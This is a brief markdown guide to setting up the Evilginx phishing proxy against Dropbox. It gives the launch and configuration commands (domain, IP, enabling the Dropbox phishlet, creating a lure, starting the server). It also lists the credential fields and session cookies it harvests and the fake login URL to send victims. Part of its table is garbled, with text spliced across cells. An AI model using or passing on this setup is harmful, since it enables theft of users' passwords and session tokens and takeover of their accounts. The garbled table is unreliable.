# Evilginx Guide for Dropbox

## Enable and Launch

```bash
./bin/evilginx -p ./phishlets

# In shell:
config domain your-domain.com
config ip YOUR_IP
phishlets enable dropbox
landers create dropbox
server
```

## Credentials Captured

| Field | Key |
|-------|-----|
| Username/Email | `login` |
| Password |

## Tokens Capt | `password`ured

- `t` - Token
- `jar` - Jar cookie
- `locale` - Locale
- `lid` - Lid token

## Login URL

```
https://your-domain.com/dropbox/login
```
